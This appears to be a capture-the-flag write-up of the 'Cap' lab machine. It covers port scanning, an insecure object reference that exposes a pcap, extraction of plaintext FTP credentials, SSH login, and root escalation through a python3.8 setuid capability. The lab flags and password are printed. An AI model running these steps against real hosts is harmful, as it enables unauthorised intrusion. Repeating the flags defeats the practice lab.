![Cap.PNG](/assets/Machines/Easy/Cap/Cap.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 1 10.10.10.245
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.245
```

**Output**
```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```


3. Visit page

![web.PNG](/assets/Machines/Easy/Cap/web.PNG)


4. Click on `Security Snapshot`

![security.PNG](/assets/Machines/Easy/Cap/security.PNG)

* URL is: `http://10.10.10.245/data/1`

5. Change the last number in **URL** and search info.

* URL: `http://10.10.10.245/data/0`

![info.PNG](/assets/Machines/Easy/Cap/info.PNG)


6. Download the file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| file 0.pcap 
0.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
```

* The file is **.pcap** you can open with **Wireshark** or **tshark**

7. Open the file with **tshark**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| tshark -r 0.pcap
```

**Output**
```bash
36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
37   4.126526 192.168.196.16 → 192.168.196.1 TCP 56 21 → 54411 [ACK] Seq=21 Ack=14 Win=64256 Len=0
38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
39   4.167701 192.168.196.1 → 192.168.196.16 TCP 62 54411 → 21 [ACK] Seq=14 Ack=55 Win=1051136 Len=0
40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS Buck3tH4TF0RM3!
```

* The file have credentials, but, you can filter most especific

8. Ways to filter data
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| tshark -r 0.pcap -Y 'ftp'
```

* Search how **ftp/tcp/http...**

---
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| tshark -r 0.pcap -Y 'ftp' -Tjson 2>/dev/null
```

* Show information in Json

**Output**
```json
...
"tcp.analysis": {
            "tcp.analysis.acks_frame": "67",
            "tcp.analysis.ack_rtt": "0.000101000",
            "tcp.analysis.initial_rtt": "0.000364000",
            "tcp.analysis.bytes_in_flight": "14",
            "tcp.analysis.push_bytes_sent": "14"
          },
          "tcp.payload": "32:32:31:20:47:6f:6f:64:62:79:65:2e:0d:0a"
...
```

---
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| tshark -r 0.pcap -Y 'ftp' -Tfields -e tcp.payload 2>/dev/null
```

* Filter for a especific field

```bash
323230202876734654506420332e302e33290d0a
55534552206e617468616e0d0a
33333120506c656173652073706563696679207468652070617373776f72642e0d0a
50415353204275636b33744834544630524d33210d0a
323330204c6f67696e207375636365737366756c2e0d0a
535953540d0a
32313520554e495820547970653a204c380d0a
504f5254203139322c3136382c3139362c312c3231322c3134300d0a
32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
4c4953540d0a
313530204865726520636f6d657320746865206469726563746f7279206c697374696e672e0d0a
323236204469726563746f72792073656e64204f4b2e0d0a
504f5254203139322c3136382c3139362c312c3231322c3134310d0a
32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
4c495354202d616c0d0a
313530204865726520636f6d657320746865206469726563746f7279206c697374696e672e0d0a
323236204469726563746f72792073656e64204f4b2e0d0a
5459504520490d0a
32303020537769746368696e6720746f2042696e617279206d6f64652e0d0a
504f5254203139322c3136382c3139362c312c3231322c3134330d0a
32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
52455452206e6f7465732e7478740d0a
353530204661696c656420746f206f70656e2066696c652e0d0a
515549540d0a
32323120476f6f646279652e0d0a
```

---
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| tshark -r 0.pcap -Y 'ftp' -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

* Convert hexadecimal data in plain text

```bash
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

9. Credentials to login `username: nathan` and `password: Buck3tH4TF0RM3!`

10. Login with ssh
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Cap]
└─| sshpass -p "Buck3tH4TF0RM3\!" ssh nathan@10.10.10.245
```

* The password is `Buck3tH4TF0RM3!`, but, you scape the special character to fix errors.


**Output**
```bash
nathan@cap:~$
```

11. Cat a **user flag**
```bash
nathan@cap:~$ cat user.txt 
0262d1b1331698269a1b63a0d3ccf484
```

---
---

## Escalate privileges 💀

1. Search all capabilities 
```bash
nathan@cap:~$ getcap -r / 2>/dev/null
```


**Output**
```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

* **Python3.8** is available, now we exploit this.


2. Get `/bin/bash` how root
```bash
nathan@cap:~$ python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@cap:~| whoami
root
```

3. Read **root flag**
```bash
root@cap:~| cat /root/root.txt 
ab8755bcb4cb8d4d4a841921e7862111
```

